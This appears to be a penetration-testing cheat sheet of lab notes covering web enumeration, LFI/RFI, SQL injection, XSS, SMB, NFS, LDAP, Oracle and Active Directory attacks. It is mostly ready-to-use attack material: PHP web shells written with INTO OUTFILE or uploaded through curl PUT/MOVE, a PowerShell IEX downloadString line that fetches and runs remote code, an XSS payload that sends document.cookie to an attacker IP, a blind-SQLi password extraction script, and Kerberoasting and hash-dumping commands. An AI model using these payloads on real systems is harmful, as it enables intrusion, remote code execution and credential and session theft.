
# HTTP 

http://<victim_IP>/robots.txt

DIRECTORY BRUTE FORCE

###  dirb ###
```bash
dirb http://<victim_ip>/
dirb http://<victim_ip>/ -r -o dirb.txt

```

### gobuster ###

```bash
gobuster -u http://<victim_ip>/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -s '200,204,301,302,307,403,500' -e -o gobuster.txt
gobuster -u http://<victim_ip>/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -s '200,204,301,302,307,403,500' -e -x html,php,asp,aspx -o gobuster.txt
gobuster -u http://<victim_ip>/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -s '200,204,301,302,307,403,500' -e -k -x html,php,asp,aspx -o gobuster.txt
```
#with wfuzz
```bash
wfuzz --hc 404,400 -c -z file,/usr/share/dirb/wordlists/big.txt http://<victim_ip>/FUZZ
```
2. Next we can try to see which ports are running locally using wfuzz tool 

```bash
wfuzz -c -z range,1-65535 --hl=2 http://10.10.10.55:60000/url.php?path=http://localhost:FUZZ`
```


### dirsearch ###
```bash
python3 dirsearch.py -u http://<victim_ip>/ -e php -x 403,404 -t 50 (Warning: This scan takes a long time to run)
```

#frebsd logs location 

```bash
/var/log/httpd-access.log
/usr/local/www/apache22/data # default location 
/root/folderMonitor.log  
/root/httpd-access.log (softlink)  
/root/ossec-alerts.log (softlink) 

```

******************************************************************************************************************************

# VULNERABILITY SCAN

#nikto: 

```bash
nikto --host=http://<victim_ip>
```
******************************************************************************************************************************


### ssh 

1. if algorithims error comes 

ssh -oKexAlgorithms=diffie-hellman-group1-sha1 -p <port> user@<ip>


### LFI

#for Linux;
```bash
http://<victim_ip>test.php?page=../../../../etc/passwd                    #basic
http://<victim_ip>test.php?page=../../../etc/passwd%00                      #null byte
http://<victim_ip>test.php?page=%252e%252e%252fetc%252fpasswd            #double encoding

http://<ip>/?pagename=php://filter/convert.base64-encode/resource=login  #php filter
```
  

for Windows;
```bash
http://<victim_ip>/test.php?page=../../../../../WINDOWS/win.ini
http://<victim_ip>/test.php?page=../../../../../xampp/apache/bin/php.ini

http://<ip>/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en 

http://192.168.1.65/?page=php://filter/convert.base64-encode/resource=index  
```
### RFI 

  ```
  http://<ip>/revshell.php?fexec=echo IEX(New-Object Net.WebClient).downloadString('http://<ip>/PowerUp.ps1') | powershell -noprofile -   
```


******************************************************************************************************************************

# SQL Injection (Manual Steps)
```
#Victim Address;
 http://<victim_ip>/test.php?id=3'

#Find the number of columns;
 http://<victim_ip>/test.php?id=3 order by 5

#Find space to output db
 http://<victim_ip>/test.php?id=3 union select 1,2,3,4,5

#Get db-username and db-version information from the database;
 http://<victim_ip>/test.php?id=3 union select 1,2,version(),4,5
 http://<victim_ip>/test.php?id=3 union select 1,2,user(),4,5

#Get all tables;
 http://<victim_ip>/test.php?id=3 union select 1,2,table_name,4,5 from information_schema.tables

#Get all columns from a specific table;
 http://<victim_ip>/test.php?id=3 union select 1,2, column_name 4,5 from information_schema.columns where table_name='wpusers'

#Viewing files;
 http://<victim_ip>/test.php?id=3' union select 1,2, load_file('/var/www/mysqli_connect.php') ,4,5 -- -
 http://<victim_ip>/test.php?id=3' union select 1,2, load_file('/etc/passwd') ,4,5 -- -

 http://<ip>/room.php?cod=9999+union+select+"1","2",(To_base64(LOAD_FILE("/var/www/html/connection.php"))),"4","5","6","7" 
	
#Uploading files;
 http://<victim_ip>/test.php?id=3' union select null,null, load_file('/var/www/brc_shell.php') ,4,5 -- -
 http://<victim_ip>/test.php?id=3' union select null,null, "<?php exec($_GET['cmd']) ?>" ,4,5 into outfile '/var/www/brc_shell.php' -- -	
```

###  Blind ###

1. admin'-- - 


Autoscript python3

```py
import requests
chars = "0123456789abcdef"
def GetSQL(i,c):
    return "user' and substr(password,%s,1) = '%s' -- -" % (i,c)
for i in range(1,33):
    for c in chars:
        injection = GetSQL(i,c)
        payload = {'username':injection,'password':"randompassword"}
        r = requests.post('http://<ip>/login.php',data = payload)
        if 'Wrong identification' in r.text:
            print(c, end ='', flush=True)
            break
print()
```




******************************************************************************************************************************





******************************************************************************************************************************
# XSS ### 
```bash
<img src=http://<ip>/test.jpeg/>

<img src=x onerror=this.src="http://<ip>/?cookie="btoa(document.cookie)/>
```
******************************************************************************************************************************

## SCENARIOS

### MySQL to SHELL
```bash
#Put shell on db to victim system;
 select 1,2,3,'<?php system($_GET[cmd]); ?>',6,7,8,9,10 INTO OUTFILE '/var/www/brc_shell.php';

#Call the shell and code execution;
 http://<victim_ip>/shell.php?cmd=ifconfig


LFI to RCE
#Inject shell to victim system;
 <?php echo shell_exec($_GET["cmd"]); ?>
 
#Call the shell and code execution;
 http://<victim_ip>/shell.php?cmd=ls -la
 ```
******************************************************************************************************************************

# CMS Enumeration
```bash 
#Wordpress
 wpscan --url http://<victim_ip>/ --enumerate p --enumerate u --enumerate t  -token <api-token>

 wpscan --url http://<ip> --wordlist=/root/Desktop/fsociety_filtered.txt --username elliot --threads 20

#Joomla
 joomscan -u  http://<victim_ip>/ --enumerate-components

#Drupal
 ./droopescan scan drupal -u <victim_ip>

# magento (cd/opt)

php magescan.phar -vv scan:all http://<ip>


# Sharepoint 

1. default location for sharepoit 
  http://<ip>/_layouts/viewlsts.aspx 
```
******************************************************************************************************************************

# CURL
```bash 
1. Uploading files to the victim system and changing the extension of the file uploaded to the victim system;
 echo worldofpentest > test.txt                       #create file
 curl -X PUT http://<victim_ip>/brc.txt -d @test.txt  #put to target
 curl http://<victim_ip>/brc.txt                      #call the file
 
2. Victim system put to shell  with curl;
 cp /usr/share/webshells/aspx/cmdasp.aspx .
 curl -X PUT http://<victim_ip>/brc_shell.txt -d @cmdasp.aspx
 curl -X MOVE -H 'Destination:http://<victim_ip>/shell.aspx' http://<victim_ip>/brc_shell.txt
  
 Note: When we shell the victim system as above, we can get run time error in the system. 
 The reason of this; the victim system noticed the shell we threw and erased the gaps.
 
3. To protect the spaces, we should use the command "--data-binary";
 curl -X PUT http://<victim_ip>/brc_shell.txt --data-binary @shell.aspx
 curl -X MOVE -H 'Destination:http://<victim_ip>/shell.aspx' http://<victim_ip>/brc_shell.txt
```
******************************************************************************************************************************

# WebDAV Server Attacks
```bash
1. What types of files can I upload to the victim system?
 davtest --url http://<victim_ip>
```
-------------------------------------------------------------------------------------------------------------------------------

# DNS ###

1. Firstly add the domain information detected during port scans to the file "/etc/hosts";
```
1. Then check the DNS servers;
 dig ns <domain_name>
 
 2. nslookup
 >server <victim_ip>

3. For zone transfer;
 dig @ns1.example.com example.com axfr

 dig axfr @<ip> Host

 or

 host -l <domain_name> <victim_ip>

 Note: "dnsrecon" tool can also be used for this.
```
-------------------------------------------------------------------------------------------------------------------------------

# SMB ###
```bash
#Controlling SMB shares;
 smbmap -H <victim_ip>


 smbmap -R <folder> -H <IP>  # Recuresive search 

  smbmap -R <folder> -H <IP> --depth 5    


 smbclient -L //IP
 
#Connect to SMB shares;
 smbclient  //<victim_ip>//share_name
 smbclient  //<victim_ip>//share_name -U mike
 smbclient //<ip>/Users -U
 
#Check null sessions;
 rpcclient -U "" -N <victim_ip>
  > srvinfo
  > enumdomusers
  > getdompwinfo
  > querydominfo
 
 Note: It is found on old windows servers.
 
#Enumerate SMB shares;
 enum4Linux -a <victim_IP>

#SMB version numbering script;
 smbver.sh -> https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html
```


# cifs share mount 
```bash
mount -t cifs -o username=Finance //<ip>/<folder> /mnt/smb/
```
 
-------------------------------------------------------------------------------------------------------------------------------

# NFS 3 ###
```bash
#Controlling public shares; <HTB jail>
 showmount -e <victim_ip>  # should be * 
 showmount -a <ip>

Example shares;
 /var
 /asd

#Mounting;
 mkdir -p /mnt/test/{sharenames}    #Indexing

 mount -t nfs -o vers=3 <ip>:<sharename> /mnt/test/<sharename>   #We mount the  directory that is open on the target to the /brc directory that we have created on our own machine. 
```
Do the the ls-la and check the user group permissions 
change the same with and access the or write the file in share



-------------------------------------------------------------------------------------------------------------------------------

# MySQL ###
```bash
#Connecting to the MySQL;
 mysql --host=INSERTIPADDRESS -u root -p
 
#Listing databases;
 show databases

#Choosing a database;
 use information_schema

#Uploading the shell;
 select 1,2,3,'<?php system($_GET[cmd]); ?>',6,7,8,9,10 INTO OUTFILE '/var/www/brc_shell.php';
 ```
-------------------------------------------------------------------------------------------------------------------------------





### IMpacket ####

```bash
1. GetADUsers.py -all active.htb/SVC_TGS -dc <ip>


2. We user below command to kerberost admin password 

GetUserSPNs.py -request -dc-ip <ip> active.htb/SVC_TGS -save -outputfile GetUserSPNs.out


3. SMB Server 
 1. impacket-smbserver <name> $(pwd) -smb2support # Attacker machine

  2. New-PSDrive -name <folder name -PSProvider "FileSystem" -Root "\\<IP>\<folder name> # At victimes windows poweshell propmt  machine 


 3. impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL  #To dump the SAM Hashes

```
 
-------------------------------------------------------------------------------------------------------------------------------





# SNMP ###
```bash 
1. snmpwalk -c public -v2c <ip>

2. snmp-check <ip>
```


-------------------------------------------------------------------------------------------------------------------------------


# IKE scan 


1. `ike-scan -M <ip>`



-------------------------------------------------------------------------------------------------------------------------------
# ldap search ### 


 ```bash
   1. ldapsearch -h <ip> -x 
   2. ldapsearch -h <ip> -x -s base namingcontexts


1. ldapsearch -h <ip> -x  -b "DC=htb,DC=local" > ldapannymous.out
   2. ldapsearch -h <ip> -x  -b "DC=htb,DC=local" '(objectClass=Person)' sAMAccountName
   3. ldapsearch -h <ip> -x  -b "DC=htb,DC=local" '(objectClass=Person)' sAMAccountName | grep sAMAccountName | awk '{print $2}' > userlist.ldap
```
-------------------------------------------------------------------------------------------------------------------------------



# ODAT ####

1. we will try to find **sid** values using ODAT py 

   1. `python3 odat.py sidguesser -h` # to see options
   2. `python3 odat.py sidguesser -s <ip> -p 1521`


we get 2 valid SID  `XE` `XEXDB`

2. We will try to guess the password using odat
  
   1. `python3 odat.py passwordguesser -h`  # to see options
   2. `python3 odat.py passwordguesser -s <ip> -d XE`


# Sqlplus ###
```bash
sqlplus64 scott/tiger@<ip>:1521/XE as sysdba
```

# volatlity 
```
1. volatility -f SILO-20180105-221806.dmp imageinfo

2. volatility -f SILO-20180105-221806.dmp --profile Win2012R2x64 hashdump
```


# Finger 
```bash
./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t <ip>
```


   
